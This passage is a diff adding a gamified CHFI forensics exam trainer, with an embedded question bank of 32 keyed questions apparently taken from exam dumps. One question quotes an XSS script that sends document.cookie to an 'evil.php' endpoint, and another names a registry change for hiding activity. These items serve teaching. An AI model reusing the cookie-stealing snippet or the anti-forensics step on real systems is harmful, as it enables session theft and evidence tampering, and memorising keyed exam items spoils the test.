@@ -1,0 +1,1244 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>CHFI NEON QUEST — 20-Day Forensics Mastery Arcade</title>
+  <script src="https://cdn.tailwindcss.com/3.4.17"></script>
+  <script src="https://unpkg.com/lucide@0.460.0/dist/umd/lucide.min.js"></script>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@500;700;800&display=swap" rel="stylesheet" />
+  <style>
+    :root {
+      --bg-deep: #070913;
+      --bg-panel: #101426;
+      --neon-cyan: #22d3ee;
+      --neon-pink: #f43f5e;
+      --neon-purple: #a855f7;
+      --neon-green: #10b981;
+      --neon-amber: #f59e0b;
+    }
+    * { box-sizing: border-box; }
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+      background: radial-gradient(circle at 15% 10%, #17153b 0%, #070913 55%, #05060d 100%);
+      color: #f8fafc;
+      min-height: 100vh;
+      overflow-x: hidden;
+    }
+    .font-mono-tech { font-family: 'JetBrains Mono', ui-monospace, Consolas, monospace; }
+    .glass {
+      background: rgba(16, 20, 38, 0.78);
+      backdrop-filter: blur(14px);
+      border: 1px solid rgba(255, 255, 255, 0.09);
+    }
+    .neon-glow-cyan { box-shadow: 0 0 22px rgba(34, 211, 238, 0.25); }
+    .neon-glow-pink { box-shadow: 0 0 24px rgba(244, 63, 94, 0.3); }
+    .neon-glow-green { box-shadow: 0 0 24px rgba(16, 185, 129, 0.28); }
+    .neon-glow-purple { box-shadow: 0 0 24px rgba(168, 85, 247, 0.3); }
+    .neon-glow-amber { box-shadow: 0 0 24px rgba(245, 158, 11, 0.28); }
+    @keyframes floatSlow {
+      0%, 100% { transform: translateY(0px); }
+      50% { transform: translateY(-6px); }
+    }
+    @keyframes shakeHit {
+      0%, 100% { transform: translateX(0); }
+      20% { transform: translateX(-8px); }
+      40% { transform: translateX(8px); }
+      60% { transform: translateX(-5px); }
+      80% { transform: translateX(5px); }
+    }
+    @keyframes popIn {
+      0% { transform: scale(0.92); opacity: 0; }
+      100% { transform: scale(1); opacity: 1; }
+    }
+    .animate-float { animation: floatSlow 3.2s ease-in-out infinite; }
+    .animate-shake { animation: shakeHit 0.35s ease; }
+    .animate-pop { animation: popIn 0.22s cubic-bezier(0.22, 1, 0.36, 1) forwards; }
+    .conveyor-track {
+      background-image: repeating-linear-gradient(
+        90deg,
+        rgba(34, 211, 238, 0.16) 0px,
+        rgba(34, 211, 238, 0.16) 24px,
+        rgba(15, 23, 42, 0.7) 24px,
+        rgba(15, 23, 42, 0.7) 48px
+      );
+      background-size: 48px 100%;
+      animation: beltScroll 0.8s linear infinite;
+    }
+    @keyframes beltScroll {
+      from { background-position-x: 0; }
+      to { background-position-x: 48px; }
+    }
+    .case-panel {
+      background: linear-gradient(135deg, #0f172a 0%, #17153b 100%);
+      border: 1.5px solid rgba(34, 211, 238, 0.22);
+      box-shadow: 6px 6px 0px rgba(34, 211, 238, 0.18);
+    }
+    #fx-canvas {
+      position: fixed;
+      inset: 0;
+      pointer-events: none;
+      z-index: 60;
+    }
+    .kbd-chip {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      min-width: 24px;
+      height: 24px;
+      padding: 0 6px;
+      font-size: 11px;
+      font-weight: 800;
+      font-family: 'JetBrains Mono', monospace;
+      border-radius: 6px;
+      background: rgba(255, 255, 255, 0.1);
+      border: 1px solid rgba(255, 255, 255, 0.22);
+      color: #e2e8f0;
+    }
+    ::-webkit-scrollbar { width: 8px; height: 8px; }
+    ::-webkit-scrollbar-track { background: #070913; }
+    ::-webkit-scrollbar-thumb { background: #334155; border-radius: 999px; }
+  </style>
+</head>
+<body class="selection:bg-cyan-500/30 selection:text-cyan-200">
+  <canvas id="fx-canvas"></canvas>
+
+  <!-- TOP HUD -->
+  <header class="sticky top-0 z-40 glass border-b border-white/10">
+    <div class="max-w-7xl mx-auto px-3 sm:px-5 py-2.5 flex flex-wrap items-center justify-between gap-3">
+      <div class="flex items-center gap-3">
+        <button id="btn-home-logo" class="flex items-center gap-2.5 group text-left">
+          <div class="w-10 h-10 rounded-xl bg-gradient-to-br from-emerald-400 via-cyan-500 to-purple-600 flex items-center justify-center font-mono-tech font-black text-base text-slate-950 shadow-lg group-hover:scale-105 transition">
+            DF
+          </div>
+          <div>
+            <div class="flex items-center gap-2">
+              <span class="font-black tracking-tight text-sm sm:text-base bg-gradient-to-r from-emerald-300 via-cyan-200 to-purple-300 bg-clip-text text-transparent">CHFI NEON QUEST</span>
+              <span id="hud-day-pill" class="px-2 py-0.5 rounded-full text-[11px] font-bold bg-cyan-500/20 text-cyan-300 border border-cyan-400/30 font-mono-tech">DAY 1</span>
+            </div>
+            <div class="text-[11px] text-slate-400 hidden sm:block">20-Day Cyber Forensics Mastery Arcade</div>
+          </div>
+        </button>
+      </div>
+
+      <!-- Center Mastery Progress -->
+      <div class="flex-1 min-w-[180px] max-w-md">
+        <div class="flex items-center justify-between text-xs mb-1">
+          <span class="text-slate-300 font-semibold">Verified Evidence: <strong id="hud-mastered-count" class="text-emerald-300 font-mono-tech">0 / 32</strong></span>
+          <span id="hud-rank-label" class="text-cyan-300 font-mono-tech font-bold">Trainee</span>
+        </div>
+        <div class="h-2.5 rounded-full bg-slate-800/90 overflow-hidden border border-white/10">
+          <div id="hud-progress-bar" class="h-full rounded-full bg-gradient-to-r from-emerald-400 via-cyan-400 to-purple-500 transition-all duration-500" style="width: 0%"></div>
+        </div>
+      </div>
+
+      <!-- Right Stats & Controls -->
+      <div class="flex items-center gap-2 sm:gap-2.5">
+        <div class="flex items-center gap-1.5 px-2.5 py-1.5 rounded-xl bg-orange-500/15 border border-orange-400/30 text-orange-300 text-xs font-bold font-mono-tech" title="Daily Streak">
+          <span>🔥</span><span id="hud-streak">0d</span>
+        </div>
+        <div class="flex items-center gap-1.5 px-2.5 py-1.5 rounded-xl bg-purple-500/15 border border-purple-400/30 text-purple-200 text-xs font-bold font-mono-tech" title="XP & Rank">
+          <span>⚡</span><span id="hud-xp" class="text-cyan-300">0 XP</span>
+        </div>
+        <button id="btn-locker-hud" class="flex items-center gap-1.5 px-2.5 py-1.5 rounded-xl bg-amber-500/15 hover:bg-amber-500/25 border border-amber-400/30 text-amber-300 text-xs font-bold font-mono-tech transition" title="Evidence Locker (Missed & Flagged)">
+          <span>🗄️</span><span id="hud-locker-count">0</span>
+        </button>
+        <button id="btn-sync-hud" class="flex items-center gap-1.5 px-2.5 py-1.5 rounded-xl bg-white/5 hover:bg-white/10 border border-white/10 text-slate-200 text-xs font-bold transition" title="Export / Import JSON Progress">
+          <span class="w-2 h-2 rounded-full bg-emerald-400"></span>
+          <span class="hidden sm:inline">Sync</span>
+        </button>
+        <button id="btn-badges-hud" class="p-2 rounded-xl bg-white/5 hover:bg-white/10 border border-white/10 text-amber-300 transition" title="Badges & Forensic Rank">
+          <i data-lucide="trophy" class="w-4 h-4"></i>
+        </button>
+        <button id="btn-audio-hud" class="p-2 rounded-xl bg-white/5 hover:bg-white/10 border border-white/10 text-cyan-300 transition" title="Toggle Arcade SFX">
+          <i data-lucide="volume-2" class="w-4 h-4"></i>
+        </button>
+      </div>
+    </div>
+  </header>
+
+  <!-- MAIN CONTAINER -->
+  <main id="app-root" class="max-w-7xl mx-auto px-3 sm:px-5 py-5 pb-20"></main>
+
+  <!-- TOAST CONTAINER -->
+  <div id="toast-container" class="fixed bottom-5 right-5 z-50 flex flex-col gap-2 pointer-events-none"></div>
+
+  <!-- MODAL OVERLAY -->
+  <div id="modal-overlay" class="fixed inset-0 z-50 bg-black/75 backdrop-blur-sm hidden items-center justify-center p-4">
+    <div id="modal-box" class="glass rounded-2xl max-w-2xl w-full max-h-[85vh] overflow-y-auto p-6 border border-white/15 animate-pop"></div>
+  </div>
+
+  <!-- EMBEDDED CHFI DATASET (Day 1 Ready; Append Days 2-20 Here or via optional questions-extra.js) -->
+  <script id="chfi-dataset" type="application/json">{"meta": {"title": "CHFI NEON QUEST — 20-Day Forensics Mastery Arcade", "source": "CHFI - Dumps.pdf + ECCouncil-312-49v9.pdf", "totalDays": 20, "days": [{"day": 1, "name": "Evidence Locker Zero", "domain": "Foundations, File Systems & Artifacts", "boss": "The Corrupted Sector", "emoji": "💾", "color": "#22d3ee"}, {"day": 2, "name": "Bit-Stream Bunker", "domain": "Acquisition, Imaging & Write Blockers", "boss": "The Write-Blocker Phantom", "emoji": "🧲", "color": "#a855f7"}, {"day": 3, "name": "Registry Vault", "domain": "Windows Registry, Logs & Recycle Bin", "boss": "The Hive Specter", "emoji": "🪟", "color": "#3b82f6"}, {"day": 4, "name": "Kernel Trench", "domain": "Linux, Mac & Boot Forensics", "boss": "The Rogue Inode", "emoji": "🐧", "color": "#10b981"}, {"day": 5, "name": "Packet Spire", "domain": "Network Forensics, Wireshark & Snort", "boss": "The SYN Flood Hydra", "emoji": "📡", "color": "#f43f5e"}, {"day": 6, "name": "Proxy Citadel", "domain": "Web Attacks, XSS, SQLi & IIS/Apache", "boss": "The Payload Weaver", "emoji": "🕸️", "color": "#f97316"}, {"day": 7, "name": "Sandbox Chamber", "domain": "Malware Analysis (Static & Dynamic)", "boss": "The Polymorphic Wraith", "emoji": "☣️", "color": "#ec4899"}, {"day": 8, "name": "Volatile Core", "domain": "Volatile Memory & Volatility", "boss": "The Fileless Ghost", "emoji": "🧠", "color": "#06b6d4"}, {"day": 9, "name": "Faraday Cage", "domain": "Mobile, SIM, IMEI & iOS/Android", "boss": "The Baseband Stalker", "emoji": "📱", "color": "#8b5cf6"}, {"day": 10, "name": "Hypervisor Sky", "domain": "Cloud, Azure, AWS & Databases", "boss": "The Tenant Breaker", "emoji": "☁️", "color": "#0ea5e9"}, {"day": 11, "name": "Header Relay", "domain": "Email Forensics, Headers & Exchange", "boss": "The Spoofed Envoy", "emoji": "📧", "color": "#eab308"}, {"day": 12, "name": "Cipher Crypt", "domain": "Steganography, Hashing & Passwords", "boss": "The Rainbow Lich", "emoji": "🔐", "color": "#14b8a6"}, {"day": 13, "name": "Daubert Court", "domain": "Legal Standards, Warrants & Testimony", "boss": "The Cross-Examiner", "emoji": "⚖️", "color": "#f59e0b"}, {"day": 14, "name": "Triage Ward", "domain": "Incident Response & First Responder", "boss": "The Zero-Day Siren", "emoji": "🚨", "color": "#ef4444"}, {"day": 15, "name": "Platter Forge", "domain": "Hard Disk Geometry, RAID & Recovery", "boss": "The Parity Shatterer", "emoji": "💿", "color": "#6366f1"}, {"day": 16, "name": "Perimeter Gate", "domain": "Wireless, Firewalls & IDS/IPS", "boss": "The Rogue Beacon", "emoji": "🛡️", "color": "#22c55e"}, {"day": 17, "name": "Shadow Wipe", "domain": "Anti-Forensics & Reconstruction", "boss": "The Timestomp Shade", "emoji": "🕶️", "color": "#d946ef"}, {"day": 18, "name": "SIEM Nexus", "domain": "Event Correlation & Log Analysis", "boss": "The False-Positive Swarm", "emoji": "📊", "color": "#38bdf8"}, {"day": 19, "name": "Case Gauntlet I", "domain": "Mixed Case Scenarios — Set A", "boss": "The APT Syndicate", "emoji": "🎯", "color": "#fb7185"}, {"day": 20, "name": "Supreme Tribunal", "domain": "Final Boss Mixed Scenarios — Set B", "boss": "The CHFI Grandmaster", "emoji": "👑", "color": "#facc15"}]}, "questions": [{"id": "D01-Q01", "day": 1, "domain": "Database Forensics", "question": "You are assigned to examine log files pertaining to the MyISAM storage engine and perform a recovery operation on a MyISAM log file. Which MySQL utility should you use?", "options": ["mysqldump", "myisamaccess", "myisamlog", "myisamchk"], "answer": 2, "explanation": "myisamlog processes and recovers operations from MyISAM log files. Memory hook: 'myisamchk' checks/repairs tables, while 'myisamlog' specifically handles log recovery."}, {"id": "D01-Q02", "day": 1, "domain": "File Formats", "question": "Each Windows BMP (Bitmap) file contains a header, the RGBQUAD array, an information header, and image data. Which element specifies the dimensions, compression type, and color format for the bitmap?", "options": ["Image data", "The RGBQUAD array", "Information header", "Header"], "answer": 2, "explanation": "The Information Header (BITMAPINFOHEADER) stores width, height, bit depth, and compression. The basic File Header only stores the 'BM' signature and file size."}, {"id": "D01-Q03", "day": 1, "domain": "Web Forensics", "question": "While auditing web application logs at a regional bank, you find attempted login submissions containing the snippet below. What kind of attack has occurred?", "evidence": "<SCRIPT type=\"text/javascript\">\nvar adr = '../evil.php?cakemonster=' + escape(document.cookie);\n<\/SCRIPT>", "options": ["Cross-site scripting (XSS)", "SQL injection", "Cross-site request forgery (CSRF)", "Buffer overflow"], "answer": 0, "explanation": "Injecting <SCRIPT> tags to exfiltrate document.cookie to an attacker's PHP endpoint is classic Cross-Site Scripting (XSS)."}, {"id": "D01-Q04", "day": 1, "domain": "File Signatures", "question": "Jack reviews file headers in a hex editor to verify a file's true format and finds the magic bytes 0xFFD8FF. What image format is this file saved as?", "options": ["ASCII", "BMP", "GIF", "JPEG"], "answer": 3, "explanation": "JPEG files always begin with FF D8 FF (SOI marker + APP0/APP1). Memory hook: 'FF D8 FF' = Foto File (JPEG)."}, {"id": "D01-Q05", "day": 1, "domain": "Lab Standards", "question": "Which ISO standard enables forensic laboratories to demonstrate that they comply with quality assurance and provide valid results?", "options": ["ISO/IEC 17025", "ISO/IEC 18025", "ISO/IEC 16025", "ISO/IEC 19025"], "answer": 0, "explanation": "ISO/IEC 17025 is the international accreditation standard for testing and calibration laboratories—including digital forensics labs."}, {"id": "D01-Q06", "day": 1, "domain": "Malware Analysis", "question": "An investigator is examining a suspicious file to uncover hidden Indicators of Compromise (IOCs) while avoiding code execution. Which type of examination should they perform?", "options": ["Static analysis", "Threat hunting", "Threat analysis", "Dynamic analysis"], "answer": 0, "explanation": "Static analysis inspects strings, headers, hashes, and imports without running the binary. Memory hook: Static = Stopped/Safe; Dynamic = Detonated."}, {"id": "D01-Q07", "day": 1, "domain": "Mobile Forensics", "question": "An IMEI is a 15-digit number identifying GSM mobile devices. What are the first eight digits—which indicate the device model and origin—called?", "options": ["Type Allocation Code (TAC)", "Manufacturer Identification Code (MIC)", "Device Origin Code (DOC)", "Integrated Circuit Code (ICC)"], "answer": 0, "explanation": "The first 8 digits of an IMEI form the Type Allocation Code (TAC), followed by a 6-digit serial number and a 1-digit Luhn check digit."}, {"id": "D01-Q08", "day": 1, "domain": "Web Attacks", "question": "Amber embeds malware into an enticing advertisement and posts it on a popular ad network that displays across legitimate websites. What is she doing?", "options": ["Compromising a legitimate site", "Click-jacking", "Spearphishing", "Malvertising"], "answer": 3, "explanation": "Malvertising (Malware + Advertising) abuses online ad networks to inject malicious payloads into trusted sites without compromising the sites themselves."}, {"id": "D01-Q09", "day": 1, "domain": "Malware Delivery", "question": "Which attack refers to the unintentional download of malicious software where an attacker exploits browser flaws to install malware merely by the user visiting a website?", "options": ["Drive-by downloads", "Phishing", "Internet Relay Chats", "Malvertising"], "answer": 0, "explanation": "In a drive-by download, simply 'driving by' (visiting) a compromised webpage triggers a silent exploit against the browser or its plugins."}, {"id": "D01-Q10", "day": 1, "domain": "Windows Forensics", "question": "Where is the Recycle Bin located on NTFS file systems in Windows Vista and later?", "options": ["Drive:\\RECYCLED", "Drive:\\$Recycle.Bin", "Drive:\\RECYCLER", "Drive:\\RECYCLE.BIN"], "answer": 1, "explanation": "Windows Vista+ uses Drive:\\$Recycle.Bin (storing $I metadata and $R data files). Memory hook: FAT = RECYCLED, XP NTFS = RECYCLER, Vista+ = $Recycle.Bin."}, {"id": "D01-Q11", "day": 1, "domain": "Mobile Forensics", "question": "To avoid the memory and startup overhead of launching multiple Dalvik VM instances, Android uses a parent process that forks rapidly for new apps. What is this process called?", "options": ["Zygote", "Init", "Daemon", "Media server"], "answer": 0, "explanation": "Like a biological zygote dividing into cells, Android's Zygote preloads core libraries and forks itself to launch new app processes quickly with shared memory."}, {"id": "D01-Q12", "day": 1, "domain": "Forensic Principles", "question": "\"In exceptional circumstances, where a person finds it necessary to access original data held on a computer or storage media, that person must be competent to do so and able to explain their actions and impact in court.\" Which ACPO principle states this?", "options": ["Principle 1", "Principle 2", "Principle 3", "Principle 4"], "answer": 1, "explanation": "ACPO Principles: P1 = Don't alter data; P2 = Competent to access original data; P3 = Maintain audit trail; P4 = Person in charge ensures compliance."}, {"id": "D01-Q13", "day": 1, "domain": "Linux Forensics", "question": "Which Linux command displays kernel ring buffers or information about device drivers loaded into the kernel?", "options": ["dmesg", "grep", "fsck", "pgrep"], "answer": 0, "explanation": "dmesg ('display/driver message') prints messages from the Linux kernel ring buffer, including hardware detection and driver loads."}, {"id": "D01-Q14", "day": 1, "domain": "Windows Forensics", "question": "Assume C:\\myfile.txt contains a hidden NTFS Alternate Data Stream named stream1. Which command displays the contents of that data stream?", "options": ["myfile.dat:stream1", "C:\\>ECHO text_message > myfile.txt:stream1", "C:\\>MORE < myfile.txt:stream1", "echo text > program:source_file"], "answer": 2, "explanation": "Redirecting input with MORE < file:stream reads and displays an NTFS Alternate Data Stream, whereas ECHO > writes/creates one."}, {"id": "D01-Q15", "day": 1, "domain": "Anti-Forensics", "question": "An attacker wants to cover their tracks on a compromised Windows system by disabling last-accessed timestamps. How can they achieve this?", "options": ["Run: fsutil behavior set enablelastaccess 0", "Set HKLM\\SYSTEM\\CurrentControlSet\\Control\\FileSystem\\NtfsDisableLastAccessUpdate to 0", "Set HKLM\\SYSTEM\\CurrentControlSet\\Control\\FileSystem\\NtfsDisableLastAccessUpdate to 1", "Run: fsutil behavior set disablelastaccess 0"], "answer": 2, "explanation": "Setting NtfsDisableLastAccessUpdate to 1 turns disabling ON (stops updating last-access timestamps). Setting it to 0 re-enables updates."}, {"id": "D01-Q16", "day": 1, "domain": "Memory Forensics", "question": "Jeff is tasked with acquiring/examining a memory dump of a Windows 10 computer involved in a DDoS attack. Which tool from the list is associated with memory forensics?", "options": ["Memcheck", "RAMMapper", "Autopsy", "Volatility"], "answer": 3, "explanation": "Volatility is the industry-standard open-source RAM forensics framework for analyzing Windows, Linux, and Mac memory dumps.", "auditFlag": {"type": "errata", "note": "Real-world note: Volatility analyzes memory dumps rather than acquiring them (use FTK Imager, DumpIt, or Belkasoft RAM Capturer to acquire). However, EC-Council's dump keys Volatility as the intended answer here."}}, {"id": "D01-Q17", "day": 1, "domain": "System Forensics", "question": "What do you call the process of studying the changes that have taken place across a system or machine after a series of actions or incidents?", "options": ["Start-up programs monitoring", "Windows services monitoring", "Host integrity monitoring", "System baselining"], "answer": 2, "explanation": "Host integrity monitoring compares a system's current state against a known baseline to detect unauthorized changes after an incident.", "auditFlag": {"type": "errata", "note": "Watch the wording: 'System baselining' is capturing the initial clean snapshot; 'Host integrity monitoring' is studying changes after actions/incidents."}}, {"id": "D01-Q18", "day": 1, "domain": "Mobile Forensics", "question": "During an investigation, first responders store mobile devices in containers to provide network isolation. All of the following are examples of such equipment EXCEPT:", "options": ["RF shield box", "VirtualBox", "Wireless StrongHold bag", "Faraday bag"], "answer": 1, "explanation": "RF shield boxes, Faraday bags, and Wireless StrongHold bags block cellular/Wi-Fi/Bluetooth signals to prevent remote wiping. VirtualBox is a virtualization hypervisor."}, {"id": "D01-Q19", "day": 1, "domain": "Log Analysis", "question": "You are analyzing IIS 7.5 web server logs and find the entry below. Based on this log entry, what occurred?", "evidence": "#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) sc-status sc-substatus sc-win32-status time-taken\n2020-04-28 11:50:54 192.168.1.39 GET /Data/Files/customer_report.xlsx - 80 - 192.168.1.200 Mozilla/5.0+... 200 0 0 54", "options": ["User at 192.168.1.200 requested customer_report.xlsx and server at 192.168.1.39 failed to process it", "User at 192.168.1.200 requested customer_report.xlsx and server at 192.168.1.39 processed it", "User at 192.168.1.39 requested customer_report.xlsx and server at 192.168.1.200 failed to process it", "User at 192.168.1.39 requested customer_report.xlsx and server at 192.168.1.200 processed it"], "answer": 1, "explanation": "Match the #Fields header: s-ip (Server) = 192.168.1.39, c-ip (Client) = 192.168.1.200, and sc-status = 200 (HTTP OK / processed successfully).", "auditFlag": {"type": "errata", "note": "The original CHFI - Dumps.pdf had a radio mark on option D (swapped server/client IPs). Reading #Fields proves c-ip is 192.168.1.200 and s-ip is 192.168.1.39."}}, {"id": "D01-Q20", "day": 1, "domain": "Legal & Courtroom", "question": "Which standard is used during a judicial trial to assess whether an expert witness's scientific testimony is based on scientifically valid reasoning and admissible?", "options": ["Joiner Standard", "Dunn Standard", "Carmichael Standard", "Daubert Standard"], "answer": 3, "explanation": "The Daubert Standard (1993 US Supreme Court) makes the judge the gatekeeper to verify that expert methods are tested, peer-reviewed, and scientifically valid."}, {"id": "D01-Q21", "day": 1, "domain": "Database Forensics", "question": "An investigator runs the command below to collect primary data files and logs from a database. What does 'WIN-CQQMK62867E' represent?", "evidence": "sqlcmd -S WIN-CQQMK62867E -e -s\",\" -E", "options": ["Name of the database", "OS of the system", "Network credentials of the database", "Name of the SQL Server"], "answer": 3, "explanation": "In Microsoft SQL Server's sqlcmd utility, the -S switch specifies the SQL Server instance name (or hostname)."}, {"id": "D01-Q22", "day": 1, "domain": "Storage Forensics", "question": "Which of the following statements is true with respect to Solid-State Drives (SSDs)?", "options": ["Faster data access, lower power usage, and higher reliability are major advantages of SSDs over HDDs", "SSDs contain tracks, clusters, and sectors to store data", "SSDs cannot store non-volatile data", "Like HDDs, SSDs also have moving parts"], "answer": 0, "explanation": "SSDs use non-volatile NAND flash memory with zero moving parts—delivering faster access, lower power draw, and better shock resistance than mechanical HDDs."}, {"id": "D01-Q23", "day": 1, "domain": "Windows Forensics", "question": "Which forensic tool allows an investigator to detect and extract hidden Alternate Data Streams on an NTFS drive?", "options": ["Stream Detector", "Autopsy", "TimeStomp", "analyzeMFT"], "answer": 0, "explanation": "Stream Detector scans NTFS volumes specifically to locate and extract hidden Alternate Data Streams (ADS). TimeStomp alters timestamps; analyzeMFT parses $MFT."}, {"id": "D01-Q24", "day": 1, "domain": "Forensics Lab", "question": "Your manager instructs you to line the walls, ceilings, and floor of a new digital forensics lab with copper. What is the primary purpose?", "options": ["To control the room temperature", "To avoid electromagnetic emanations", "To make the lab soundproof", "To strengthen the walls, ceiling, and floor"], "answer": 1, "explanation": "Copper lining turns the lab into a Faraday cage / TEMPEST-shielded room, blocking electromagnetic emanations and wireless RF interference."}, {"id": "D01-Q25", "day": 1, "domain": "Data Recovery", "question": "A disgruntled employee deleted the partition of a hard drive to hide their actions. Which tool should the forensic investigator use to restore the deleted partition and data?", "options": ["Diskview", "EFSDump", "Diskmon", "R-Studio"], "answer": 3, "explanation": "R-Studio is a comprehensive data recovery tool capable of reconstructing deleted or damaged partitions and recovering files across NTFS, FAT, Ext, and HFS+."}, {"id": "D01-Q26", "day": 1, "domain": "Network Forensics", "question": "Jonathan is testing internal security and attempts to hijack an HTTP session of a user connected to his web server using Ettercap. According to EC-Council, why will Jonathan not succeed?", "options": ["Only an HTTPS session can be hijacked", "HTTP protocol does not maintain session", "Only FTP traffic can be hijacked", "Only DNS traffic can be hijacked"], "answer": 1, "explanation": "HTTP is a stateless protocol—it does not natively maintain persistent sessions at the protocol layer (web apps rely on cookies/tokens to simulate state)."}, {"id": "D01-Q27", "day": 1, "domain": "Data Acquisition", "question": "Which of the following tools creates a forensic bit-by-bit image of evidence media?", "options": ["Recuva", "FileMerlin", "AccessData FTK Imager", "Xplico"], "answer": 2, "explanation": "AccessData FTK Imager creates forensically sound bit-stream copies (Raw/dd, E01, AFF). Recuva recovers files; Xplico decodes network traffic."}, {"id": "D01-Q28", "day": 1, "domain": "Storage Forensics", "question": "An employee tries to wipe CDs and DVDs using a large magnet. Why is this ineffective?", "options": ["CDs and DVDs are logical media", "CDs and DVDs are anti-magnetic media", "CDs and DVDs are magnetic media", "CDs and DVDs are optical media"], "answer": 3, "explanation": "CDs and DVDs are optical media—data is stored physically as microscopic pits read by a laser, so magnetic fields (degaussing) have no effect on them."}, {"id": "D01-Q29", "day": 1, "domain": "Linux Forensics", "question": "A Linux system is powered on and undergoing live investigation. In which directory should investigators look for current runtime state data?", "options": ["/auth", "/proc", "/var/log/debug", "/var/spool/cron/"], "answer": 1, "explanation": "/proc is a virtual pseudo-filesystem in Linux that exposes live kernel parameters, running processes (by PID), open files, and memory maps."}, {"id": "D01-Q30", "day": 1, "domain": "Database Forensics", "question": "Analyze the hex/ASCII dump of mysql-bin.000013 below. What can be inferred from this analysis?", "evidence": "Hex Workshop - [C:\\Evidence\\mysql-bin.000013]\nINSERT INTO `wordpress`.`wp_users` (`ID`, `user_login`, `user_pass`, `user_nicename`, `user_email`, `user_status`, `display_name`)\nVALUES ('123', 'bad_guy', MD5('hackspirit'), 'anonymous_hacker', 'badguy@abc.com', '0', 'Temp User')", "options": ["A user with username bad_guy has logged into the WordPress web application", "A WordPress user has been created with the username anonymous_hacker", "An attacker named anonymous_hacker replaced user bad_guy in the database", "A WordPress user has been created with the username bad_guy"], "answer": 3, "explanation": "INSERT INTO wp_users creates a new account. Matching column order: `user_login` = 'bad_guy', while 'anonymous_hacker' is only the `user_nicename`.", "auditFlag": {"type": "media", "note": "Transcribed directly from the Hex Workshop screenshot in ECCouncil-312-49v9.pdf (Q#6)."}}, {"id": "D01-Q31", "day": 1, "domain": "Network Forensics", "question": "Your SNMP software manager is not receiving data from remote offices after firewall changes. Which TWO ports should you open for SNMP to work through firewalls? (Choose two.)", "options": ["162", "161", "163", "160"], "answer": [0, 1], "explanation": "SNMP uses UDP port 161 for standard queries/polling and UDP port 162 for asynchronous SNMP Trap notifications."}, {"id": "D01-Q32", "day": 1, "domain": "File Systems", "question": "What is the name of the first reserved sector in a File Allocation Table (FAT) system (per EC-Council's exam bank)?", "options": ["Volume Boot Record", "Partition Boot Sector", "Master Boot Record", "BIOS Parameter Block"], "answer": 2, "explanation": "EC-Council's v9 exam bank keys Master Boot Record (MBR) as sector 0 of the disk.", "auditFlag": {"type": "errata", "note": "Technical accuracy note: Sector 0 of the physical disk is the MBR, while the first reserved sector of a FAT partition itself is the Volume Boot Record (VBR / Partition Boot Sector). Keep EC-Council's keyed answer in mind for v9 exams."}}]}</script>
+  <!-- Optional drop-in file for future batches: window.CHFI_EXTRA_QUESTIONS = [...] -->
+  <script src="questions-extra.js" onerror="/* optional */"></script>
+
+  <script>
+  (() => {
+    const STORAGE_KEY = 'chfi_neon_quest_v1';
+
+    const RANKS = [
+      { name: 'Trainee', minXp: 0, icon: '🔰', color: 'text-slate-300' },
+      { name: 'First Responder', minXp: 300, icon: '🚨', color: 'text-cyan-300' },
+      { name: 'Lab Analyst', minXp: 1000, icon: '🔬', color: 'text-emerald-300' },
+      { name: 'Lead Investigator', minXp: 2500, icon: '🕵️', color: 'text-purple-300' },
+      { name: 'Expert Witness', minXp: 5000, icon: '⚖️', color: 'text-amber-300' }
+    ];
+
+    const BADGES = [
+      { id: 'first_blood', icon: '🎯', name: 'First Evidence Verified', desc: 'Answer your first CHFI question correctly', check: s => Object.values(s.answered).some(a => a.correct) },
+      { id: 'day1_clear', icon: '💾', name: 'Case File 01 Closed', desc: 'Verify all loaded questions in Day 1', check: (s, qs) => { const d1 = qs.filter(q => q.day === 1); return d1.length > 0 && d1.every(q => s.answered[q.id]?.correct); } },
+      { id: 'combo5', icon: '⚡', name: 'SOC Reflexes', desc: 'Hit a 5x combo in Incident Triage', check: s => s.bestCombo >= 5 },
+      { id: 'locker_clear', icon: '🗄️', name: 'Chain of Custody Intact', desc: 'Clear an item from the Evidence Locker (2x streak)', check: s => s.lockerCleared >= 1 },
+      { id: 'court_pass', icon: '⚖️', name: 'Courtroom Qualified', desc: 'Score 70% or higher in Courtroom Exam', check: s => (s.bestExamScore ?? 0) >= 70 },
+      { id: 'xp_1000', icon: '🔬', name: 'Lab Analyst Rank', desc: 'Reach 1,000 total XP', check: s => s.xp >= 1000 }
+    ];
+
+    // Load Dataset
+    const rawData = JSON.parse(document.getElementById('chfi-dataset').textContent);
+    const DAYS_META = rawData.meta.days;
+    const QUESTIONS = [...rawData.questions, ...(Array.isArray(window.CHFI_EXTRA_QUESTIONS) ? window.CHFI_EXTRA_QUESTIONS : [])];
+
+    const DEFAULT_STATE = {
+      xp: 0,
+      streak: 0,
+      lastActiveDate: null,
+      bestCombo: 0,
+      bestExamScore: null,
+      lockerCleared: 0,
+      selectedDay: 1,
+      audioOn: true,
+      answered: {}, // { [id]: { correct: bool, attempts: n, hits: n } }
+      locker: {}    // { [id]: { streak: 0|1, flagged: bool, missed: bool } }
+    };
+
+    let state = loadState();
+    let route = 'home'; // 'home' | 'session' | 'exam-setup' | 'summary' | 'codex'
+    let session = null;
+    let timerInterval = null;
+    let codexFilter = 'all';
+    let codexQuery = '';
+
+    const $ = id => document.getElementById(id);
+    const root = $('app-root');
+
+    // ==================== PERSISTENCE ====================
+    function loadState() {
+      try {
+        const saved = localStorage.getItem(STORAGE_KEY);
+        return saved ? { ...DEFAULT_STATE, ...JSON.parse(saved) } : structuredClone(DEFAULT_STATE);
+      } catch {
+        return structuredClone(DEFAULT_STATE);
+      }
+    }
+
+    function saveState() {
+      localStorage.setItem(STORAGE_KEY, JSON.stringify(state));
+      updateHUD();
+    }
+
+    function touchStreak() {
+      const today = new Date().toISOString().slice(0, 10);
+      if (state.lastActiveDate === today) return;
+      if (state.lastActiveDate) {
+        const diff = Math.round((new Date(today) - new Date(state.lastActiveDate)) / 86400000);
+        state.streak = diff === 1 ? state.streak + 1 : 1;
+      } else {
+        state.streak = 1;
+      }
+      state.lastActiveDate = today;
+    }
+
+    function getRank(xp) {
